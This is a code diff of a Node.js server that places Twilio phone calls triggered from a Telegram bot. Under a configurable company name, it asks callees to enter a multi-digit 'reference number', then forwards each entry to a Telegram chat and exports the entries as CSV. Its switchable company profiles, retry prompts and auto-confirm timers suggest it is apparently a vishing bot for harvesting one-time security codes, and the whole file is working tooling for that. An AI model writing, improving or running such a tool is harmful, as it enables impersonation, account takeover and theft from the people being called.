@@ -10,7 +10,10 @@ app.use(express.urlencoded({ extended: true }));
 
 const PORT = process.env.PORT || 3000;
 
-// ===== ENV =====
+// ============================================================
+// ENV
+// ============================================================
+
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 
@@ -36,14 +39,17 @@ const QUICK_DIAL_C_NUMBER = process.env.QUICK_DIAL_C_NUMBER || "";
 
 const client = twilio(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN);
 
-// ===== DB =====
+// ============================================================
+// DATABASE
+// ============================================================
+
 const DB_FILE = path.join(__dirname, "db.json");
 
 const defaultSettings = {
   company: "Support",
   digits: 6,
   assistant: 0,
-  itemName: "ticket number",
+  itemName: "reference number",
   greeting:
     "Hello from {company}. Please enter your {digits} digit {item}.",
   retryMessage: "Please re-enter your {item}.",
@@ -57,58 +63,58 @@ const defaultSettings = {
   autoHangupSec: 0,
   paused: false,
   readback: false,
-  randomAssistant: false
+  randomAssistant: false,
+  panelTitle: "📞 LIVE CALLS"
 };
 
-let db = {
-  settings: { ...defaultSettings },
-  profiles: {},
-  history: [],
-  logs: [],
-  codes: [],
-  stats: {
-    inboundCalls: 0,
-    outboundCalls: 0,
-    inputsReceived: 0,
-    confirmed: 0,
-    retries: 0,
-    hungUp: 0,
-    autoConfirmed: 0,
-    autoHungUp: 0,
-    scheduledCalls: 0,
-    completedCalls: 0
-  }
-};
+function defaultDB() {
+  return {
+    settings: { ...defaultSettings },
+    profiles: {},
+    history: [],
+    logs: [],
+    codes: [],
+    stats: {
+      inboundCalls: 0,
+      outboundCalls: 0,
+      inputsReceived: 0,
+      confirmed: 0,
+      retries: 0,
+      hungUp: 0,
+      autoConfirmed: 0,
+      autoHungUp: 0,
+      scheduledCalls: 0,
+      completedCalls: 0
+    }
+  };
+}
+
+let db = defaultDB();
 
 function loadDB() {
   try {
-    if (fs.existsSync(DB_FILE)) {
-      const raw = fs.readFileSync(DB_FILE, "utf8");
-      const parsed = JSON.parse(raw);
-
-      db = {
-        settings: { ...defaultSettings, ...(parsed.settings || {}) },
-        profiles: parsed.profiles || {},
-        history: parsed.history || [],
-        logs: parsed.logs || [],
-        codes: parsed.codes || [],
-        stats: {
-          inboundCalls: 0,
-          outboundCalls: 0,
-          inputsReceived: 0,
-          confirmed: 0,
-          retries: 0,
-          hungUp: 0,
-          autoConfirmed: 0,
-          autoHungUp: 0,
-          scheduledCalls: 0,
-          completedCalls: 0,
-          ...(parsed.stats || {})
-        }
-      };
+    if (!fs.existsSync(DB_FILE)) {
+      db = defaultDB();
+      return;
     }
+
+    const raw = fs.readFileSync(DB_FILE, "utf8");
+    const parsed = JSON.parse(raw);
+
+    db = {
+      settings: { ...defaultSettings, ...(parsed.settings || {}) },
+      profiles: parsed.profiles || {},
+      history: parsed.history || [],
+      logs: parsed.logs || [],
+      codes: parsed.codes || [],
+      stats: {
+        ...defaultDB().stats,
+        ...(parsed.stats || {})
+      }
+    };
   } catch (e) {
     console.log("loadDB error:", e.message);
+    db = defaultDB();
   }
 }
 
@@ -122,7 +128,10 @@ function saveDB() {
 
 loadDB();
 
-// ===== SETTINGS =====
+// ============================================================
+// SETTINGS / STATE
+// ============================================================
+
 let settings = db.settings;
 
 const assistants = [
@@ -140,19 +149,19 @@ const quickDialTargets = {
   [QUICK_DIAL_C_LABEL]: QUICK_DIAL_C_NUMBER
 };
 
-// ===== STATE =====
 const calls = new Map();
+
 let panelMessageId = null;
+let panelDirty = false;
 let panelBrokenCount = 0;
+
+let lastDialed = null;
 let pendingInput = null;
 let scheduledJobs = [];
-let lastDialed = null;
-let panelDirty = false;
 
-// ===== HELPERS =====
-function markPanelDirty() {
-  panelDirty = true;
-}
+// ============================================================
+// HELPERS
+// ============================================================
 
 function saveSettings() {
   db.settings = settings;
@@ -162,6 +171,33 @@ function saveSettings() {
 function incStat(key) {
   db.stats[key] = (db.stats[key] || 0) + 1;
   saveDB();
+}
+
+function pushLog(text) {
+  db.logs.unshift(`${new Date().toLocaleTimeString()} ${text}`);
+  db.logs = db.logs.slice(0, 100);
+  saveDB();
+}
+
+function pushHistory(text) {
+  db.history.unshift(`${new Date().toLocaleString()} ${text}`);
+  db.history = db.history.slice(0, 300);
+  saveDB();
+}
+
+function pushCodeEntry(caller, value, sid = "") {
+  db.codes.unshift({
+    time: new Date().toLocaleString(),
+    caller,
+    value,
+    sid
+  });
+  db.codes = db.codes.slice(0, 200);
+  saveDB();
+}
+
+function markPanelDirty() {
+  panelDirty = true;
 }
 
 function isAuthorized(update) {
@@ -192,26 +228,30 @@ function template(str, call = null) {
     .replaceAll("{caller}", call?.caller || "caller");
 }
 
-function pushLog(text) {
-  db.logs.unshift(`${new Date().toLocaleTimeString()} ${text}`);
-  db.logs = db.logs.slice(0, 60);
-  saveDB();
+function spacedDigits(value) {
+  return String(value || "")
+    .split("")
+    .join(" ");
 }
 
-function pushHistory(text) {
-  db.history.unshift(`${new Date().toLocaleString()} ${text}`);
-  db.history = db.history.slice(0, 200);
-  saveDB();
+function callTimerText(call) {
+  if (!call || !call.startedAt) return "00:00";
+  const total = Math.floor((Date.now() - call.startedAt) / 1000);
+  const mm = String(Math.floor(total / 60)).padStart(2, "0");
+  const ss = String(total % 60).padStart(2, "0");
+  return `${mm}:${ss}`;
 }
 
-function pushCodeEntry(caller, value) {
-  db.codes.unshift({
-    time: new Date().toLocaleString(),
-    caller,
-    value
-  });
-  db.codes = db.codes.slice(0, 100);
-  saveDB();
+function sortedCalls() {
+  return Array.from(calls.values()).sort(
+    (a, b) => (b.startedAt || 0) - (a.startedAt || 0)
+  );
+}
+
+function newestActiveCall() {
+  return sortedCalls().find(
+    c => c.status !== "Ended" && c.status !== "Idle"
+  ) || null;
 }
 
 function getOrCreateCall(callSid) {
@@ -230,9 +270,9 @@ function getOrCreateCall(callSid) {
       startedAt: Date.now(),
       assistantIndex: ai,
       retries: 0,
+      endedAt: null,
       autoConfirmTimer: null,
       autoHangupTimer: null,
-      endedAt: null,
       readbackDone: false,
       newInput: false
     });
@@ -262,44 +302,22 @@ function cleanupEndedCalls() {
   }
 }
 
-function callTimerText(call) {
-  if (!call || !call.startedAt) return "00:00";
-  const total = Math.floor((Date.now() - call.startedAt) / 1000);
-  const mm = String(Math.floor(total / 60)).padStart(2, "0");
-  const ss = String(total % 60).padStart(2, "0");
-  return `${mm}:${ss}`;
-}
-
-function sortedCalls() {
-  return Array.from(calls.values()).sort(
-    (a, b) => (b.startedAt || 0) - (a.startedAt || 0)
-  );
-}
-
-function newestActiveCall() {
-  return sortedCalls().find(c => c.status !== "Ended" && c.status !== "Idle") || null;
-}
-
-function spacedDigits(value) {
-  return String(value || "")
-    .split("")
-    .join(" ");
-}
-
 function toCsv(rows) {
-  const header = "time,caller,value\n";
-  const body = rows
-    .map(r => {
-      const time = `"${String(r.time).replaceAll('"', '""')}"`;
-      const caller = `"${String(r.caller).replaceAll('"', '""')}"`;
-      const value = `"${String(r.value).replaceAll('"', '""')}"`;
-      return `${time},${caller},${value}`;
-    })
-    .join("\n");
+  const header = "time,caller,value,sid\n";
+  const body = rows.map(r => {
+    const time = `"${String(r.time).replaceAll('"', '""')}"`;
+    const caller = `"${String(r.caller).replaceAll('"', '""')}"`;
+    const value = `"${String(r.value).replaceAll('"', '""')}"`;
+    const sid = `"${String(r.sid || "").replaceAll('"', '""')}"`;
+    return `${time},${caller},${value},${sid}`;
+  }).join("\n");
   return header + body;
 }
 
-// ===== TELEGRAM =====
+// ============================================================
+// TELEGRAM API
+// ============================================================
+
 async function tg(method, data) {
   const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/${method}`, {
     method: "POST",
@@ -314,7 +332,9 @@ async function tgSend(text, buttons = null) {
     chat_id: CHAT_ID,
     text
   };
-  if (buttons) body.reply_markup = { inline_keyboard: buttons };
+  if (buttons) {
+    body.reply_markup = { inline_keyboard: buttons };
+  }
   return tg("sendMessage", body);
 }
 
@@ -324,7 +344,9 @@ async function tgEdit(messageId, text, buttons = null) {
     message_id: messageId,
     text
   };
-  if (buttons) body.reply_markup = { inline_keyboard: buttons };
+  if (buttons) {
+    body.reply_markup = { inline_keyboard: buttons };
+  }
   return tg("editMessageText", body);
 }
 
@@ -338,9 +360,9 @@ async function tgAnswerCallback(callbackQueryId, text = "") {
 }
 
 async function tgSendDocument(filename, contentBuffer) {
+  const boundary = "----NodeFormBoundary" + Math.random().toString(16).slice(2);
   const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`;
 
-  const boundary = "----NodeFormBoundary" + Math.random().toString(16).slice(2);
   const chunks = [];
 
   function pushString(str) {
@@ -371,7 +393,10 @@ async function tgSendDocument(filename, contentBuffer) {
   return res.json();
 }
 
-// ===== PANEL =====
+// ============================================================
+// PANEL
+// ============================================================
+
 function panelButtons() {
   const quickButtons = Object.entries(quickDialTargets)
     .filter(([, value]) => value)
@@ -416,7 +441,7 @@ function panelText() {
   cleanupEndedCalls();
 
   const active = sortedCalls().slice(0, 8);
-  const lines = ["📞 LIVE CALLS", ""];
+  const lines = [settings.panelTitle, ""];
 
   if (!active.length) {
     lines.push("No active calls");
@@ -491,7 +516,10 @@ async function updatePanel(forceNew = false) {
   }
 }
 
-// ===== TWILIO CONTROL =====
+// ============================================================
+// TWILIO CONTROL
+// ============================================================
+
 async function startCall(number) {
   if (!number) return;
 
@@ -695,7 +723,10 @@ function parseDelay(text) {
   return null;
 }
 
-// ===== ROUTES =====
+// ============================================================
+// ROUTES
+// ============================================================
+
 app.get("/", (req, res) => {
   res.send("Server running");
 });
@@ -719,7 +750,10 @@ app.get("/ivr", (req, res) => {
   res.send(`<Response><Say>IVR endpoint is working.</Say></Response>`);
 });
 
-// ===== CALL STATUS =====
+// ============================================================
+// CALL STATUS
+// ============================================================
+
 app.post("/call-status", async (req, res) => {
   try {
     const status = req.body.CallStatus;
@@ -756,7 +790,10 @@ app.post("/call-status", async (req, res) => {
   res.sendStatus(200);
 });
 
-// ===== IVR START =====
+// ============================================================
+// IVR START
+// ============================================================
+
 app.post("/ivr", async (req, res) => {
   try {
     const sid = req.body.CallSid;
@@ -796,7 +833,10 @@ Calling is currently paused. Please try again later.
   }
 });
 
-// ===== INPUT =====
+// ============================================================
+// INPUT
+// ============================================================
+
 app.post("/input", async (req, res) => {
   try {
     const digits = req.body.Digits;
@@ -804,6 +844,7 @@ app.post("/input", async (req, res) => {
     const sid = req.body.CallSid;
 
     const call = getOrCreateCall(sid);
+
     if (call) {
       call.caller = caller;
       call.input = digits;
@@ -816,20 +857,22 @@ app.post("/input", async (req, res) => {
     incStat("inputsReceived");
     pushLog(`${caller} : ${digits}`);
     pushHistory(`${caller} -> ${settings.itemName}: ${digits}`);
-    pushCodeEntry(caller, digits);
+    pushCodeEntry(caller, digits, sid);
 
     res.type("text/xml");
     res.send(buildReviewTwiml(call));
 
     try {
-    await tgSend(`${digits}`);
+      // separate entry message
+      await tgSend(`${digits}`);
 
-    if (!panelMessageId) {
-    await updatePanel(true);
-   } else {
-    markPanelDirty();
-    await updatePanel();
-}
+      // auto-create panel if missing, otherwise refresh existing one
+      if (!panelMessageId) {
+        await updatePanel(true);
+      } else {
+        markPanelDirty();
+        await updatePanel();
+      }
     } catch (e) {
       console.log("telegram send error:", e.message);
     }
@@ -842,7 +885,10 @@ app.post("/input", async (req, res) => {
   }
 });
 
-// ===== HOLD =====
+// ============================================================
+// HOLD
+// ============================================================
+
 app.post("/hold", (req, res) => {
   res.type("text/xml");
   res.send(`
@@ -853,7 +899,10 @@ app.post("/hold", (req, res) => {
 `);
 });
 
-// ===== TELEGRAM =====
+// ============================================================
+// TELEGRAM
+// ============================================================
+
 app.post("/telegram", async (req, res) => {
   try {
     const update = req.body || {};
@@ -862,6 +911,9 @@ app.post("/telegram", async (req, res) => {
       return res.sendStatus(200);
     }
 
+    // -------------------------
+    // Button callbacks
+    // -------------------------
     if (update.callback_query) {
       const action = update.callback_query.data;
       const callbackId = update.callback_query.id;
@@ -939,7 +991,7 @@ app.post("/telegram", async (req, res) => {
 
       if (action === "call") {
         pendingInput = "call";
-        await tgSend("Send the number to call.\nExample:\n/call +447123456789");
+        await tgSend("Send number to call.\nExample:\n/call +447123456789");
         await tgAnswerCallback(callbackId, "Waiting for number");
         return res.sendStatus(200);
       }
@@ -971,6 +1023,7 @@ app.post("/telegram", async (req, res) => {
 
       if (action === "status") {
         markPanelDirty();
+        await updatePanel();
         await tgAnswerCallback(callbackId, "Panel refreshed");
         return res.sendStatus(200);
       }
@@ -1001,6 +1054,7 @@ app.post("/telegram", async (req, res) => {
       if (action.startsWith("profile:")) {
         const name = action.split(":")[1];
         const profile = db.profiles[name];
+
         if (profile) {
           settings.company = profile.company;
           settings.digits = profile.digits;
@@ -1009,14 +1063,19 @@ app.post("/telegram", async (req, res) => {
           saveSettings();
           await tgSend(`📁 Profile loaded: ${name}`);
           markPanelDirty();
+          await updatePanel();
         } else {
           await tgSend("Profile not found");
         }
+
         await tgAnswerCallback(callbackId, "Profile");
         return res.sendStatus(200);
       }
     }
 
+    // -------------------------
+    // Text commands
+    // -------------------------
     if (update.message && update.message.text) {
       const text = update.message.text.trim();
 
@@ -1084,16 +1143,36 @@ Paused: ${settings.paused ? "Yes" : "No"}`);
       }
 
       if (text === "/logs") {
-        let textOut = "📜 Logs\n\n";
-        db.logs.slice(0, 25).forEach(l => (textOut += l + "\n"));
-        await tgSend(textOut);
+        let out = "📜 Logs\n\n";
+        db.logs.slice(0, 25).forEach(l => {
+          out += l + "\n";
+        });
+        await tgSend(out);
         return res.sendStatus(200);
       }
 
       if (text === "/history") {
-        let textOut = "🗂 History\n\n";
-        db.history.slice(0, 30).forEach(l => (textOut += l + "\n"));
-        await tgSend(textOut);
+        let out = "🗂 History\n\n";
+        db.history.slice(0, 30).forEach(l => {
+          out += l + "\n";
+        });
+        await tgSend(out);
+        return res.sendStatus(200);
+      }
+
+      if (text === "/stats") {
+        await tgSend(`📈 Stats
+
+Inbound: ${db.stats.inboundCalls}
+Outbound: ${db.stats.outboundCalls}
+Inputs: ${db.stats.inputsReceived}
+Confirmed: ${db.stats.confirmed}
+Retries: ${db.stats.retries}
+Hung Up: ${db.stats.hungUp}
+Auto Confirmed: ${db.stats.autoConfirmed}
+Auto Hung Up: ${db.stats.autoHungUp}
+Completed: ${db.stats.completedCalls}
+Scheduled: ${db.stats.scheduledCalls}`);
         return res.sendStatus(200);
       }
 
@@ -1119,23 +1198,7 @@ Paused: ${settings.paused ? "Yes" : "No"}`);
 
       if (text === "/export") {
         const csv = toCsv(db.codes);
-        await tgSendDocument("codes.csv", Buffer.from(csv, "utf8"));
-        return res.sendStatus(200);
-      }
-
-      if (text === "/stats") {
-        await tgSend(`📈 Stats
-
-Inbound: ${db.stats.inboundCalls}
-Outbound: ${db.stats.outboundCalls}
-Inputs: ${db.stats.inputsReceived}
-Confirmed: ${db.stats.confirmed}
-Retries: ${db.stats.retries}
-Hung Up: ${db.stats.hungUp}
-Auto Confirmed: ${db.stats.autoConfirmed}
-Auto Hung Up: ${db.stats.autoHungUp}
-Completed: ${db.stats.completedCalls}
-Scheduled: ${db.stats.scheduledCalls}`);
+        await tgSendDocument("entries.csv", Buffer.from(csv, "utf8"));
         return res.sendStatus(200);
       }
 
@@ -1151,6 +1214,7 @@ Scheduled: ${db.stats.scheduledCalls}`);
 
       if (text.startsWith("/saveprofile")) {
         const name = text.split(" ")[1];
+
         if (!name) {
           await tgSend("Usage: /saveprofile name");
         } else {
@@ -1163,12 +1227,15 @@ Scheduled: ${db.stats.scheduledCalls}`);
           saveDB();
           await tgSend(`✅ Profile saved: ${name}`);
           markPanelDirty();
+          await updatePanel();
         }
+
         return res.sendStatus(200);
       }
 
       if (text.startsWith("/profile")) {
         const name = text.split(" ")[1];
+
         if (!name || !db.profiles[name]) {
           await tgSend("Profile not found");
         } else {
@@ -1180,12 +1247,15 @@ Scheduled: ${db.stats.scheduledCalls}`);
           saveSettings();
           await tgSend(`📁 Profile loaded: ${name}`);
           markPanelDirty();
+          await updatePanel();
         }
+
         return res.sendStatus(200);
       }
 
       if (text.startsWith("/deleteprofile")) {
         const name = text.split(" ")[1];
+
         if (!name || !db.profiles[name]) {
           await tgSend("Profile not found");
         } else {
@@ -1193,7 +1263,9 @@ Scheduled: ${db.stats.scheduledCalls}`);
           saveDB();
           await tgSend(`🗑 Profile deleted: ${name}`);
           markPanelDirty();
+          await updatePanel();
         }
+
         return res.sendStatus(200);
       }
 
@@ -1225,6 +1297,7 @@ Scheduled: ${db.stats.scheduledCalls}`);
           saveSettings();
           await tgSend(`✅ ${d} digits set`);
           markPanelDirty();
+          await updatePanel();
         } else {
           await tgSend("Use /digits 2 to 10");
         }
@@ -1238,6 +1311,7 @@ Scheduled: ${db.stats.scheduledCalls}`);
           saveSettings();
           await tgSend(`🎙 ${assistant().name} assistant set`);
           markPanelDirty();
+          await updatePanel();
         } else {
           await tgSend("Use /assistant 1 to 6");
         }
@@ -1253,6 +1327,7 @@ Scheduled: ${db.stats.scheduledCalls}`);
           saveSettings();
           await tgSend(`🏢 Company set to ${settings.company}`);
           markPanelDirty();
+          await updatePanel();
         }
         return res.sendStatus(200);
       }
@@ -1266,6 +1341,7 @@ Scheduled: ${db.stats.scheduledCalls}`);
           saveSettings();
           await tgSend(`📝 Item set to ${settings.itemName}`);
           markPanelDirty();
+          await updatePanel();
         }
         return res.sendStatus(200);
       }
@@ -1277,6 +1353,7 @@ Scheduled: ${db.stats.scheduledCalls}`);
           saveSettings();
           await tgSend(`🔁 Max retries set to ${n}`);
           markPanelDirty();
+          await updatePanel();
         } else {
           await tgSend("Usage: /maxretries 3");
         }
@@ -1290,6 +1367,7 @@ Scheduled: ${db.stats.scheduledCalls}`);
           saveSettings();
           await tgSend(`⏱ Input timeout set to ${n}s`);
           markPanelDirty();
+          await updatePanel();
         } else {
           await tgSend("Usage: /timeout 8");
         }
@@ -1303,6 +1381,7 @@ Scheduled: ${db.stats.scheduledCalls}`);
           saveSettings();
           await tgSend(`✅ Auto confirm set to ${n}s`);
           markPanelDirty();
+          await updatePanel();
         } else {
           await tgSend("Usage: /autoconfirm 0");
         }
@@ -1316,6 +1395,7 @@ Scheduled: ${db.stats.scheduledCalls}`);
           saveSettings();
           await tgSend(`⛔ Auto hangup set to ${n}s`);
           markPanelDirty();
+          await updatePanel();
         } else {
           await tgSend("Usage: /autohangup 0");
         }
@@ -1327,6 +1407,7 @@ Scheduled: ${db.stats.scheduledCalls}`);
         saveSettings();
         await tgSend("⏸ Calling paused");
         markPanelDirty();
+        await updatePanel();
         return res.sendStatus(200);
       }
 
@@ -1335,6 +1416,7 @@ Scheduled: ${db.stats.scheduledCalls}`);
         saveSettings();
         await tgSend("▶ Calling resumed");
         markPanelDirty();
+        await updatePanel();
         return res.sendStatus(200);
       }
 
@@ -1348,10 +1430,12 @@ Scheduled: ${db.stats.scheduledCalls}`);
             removeCallTimers(c);
           } catch {}
         }
+
         settings.paused = true;
         saveSettings();
         await tgSend("🛑 All calls stopped and calling paused");
         markPanelDirty();
+        await updatePanel();
         return res.sendStatus(200);
       }
 
@@ -1380,6 +1464,7 @@ Scheduled: ${db.stats.scheduledCalls}`);
             await tgSend(`⏰ Scheduled ${number} in ${delayRaw}`);
           }
         }
+
         return res.sendStatus(200);
       }
     }
@@ -1390,7 +1475,10 @@ Scheduled: ${db.stats.scheduledCalls}`);
   res.sendStatus(200);
 });
 
-// ===== LIVE PANEL =====
+// ============================================================
+// LIVE PANEL LOOP
+// ============================================================
+
 setInterval(() => {
   if (panelDirty && panelMessageId) {
     panelDirty = false;
@@ -1399,11 +1487,14 @@ setInterval(() => {
   cleanupEndedCalls();
 }, 500);
 
+// ============================================================
+// STARTUP
+// ============================================================
+
 app.listen(PORT, async () => {
   console.log("Server started");
   console.log("Server booted and ready");
 
-  // create Telegram panel automatically
   try {
     await new Promise(r => setTimeout(r, 3000));
     await updatePanel(true);
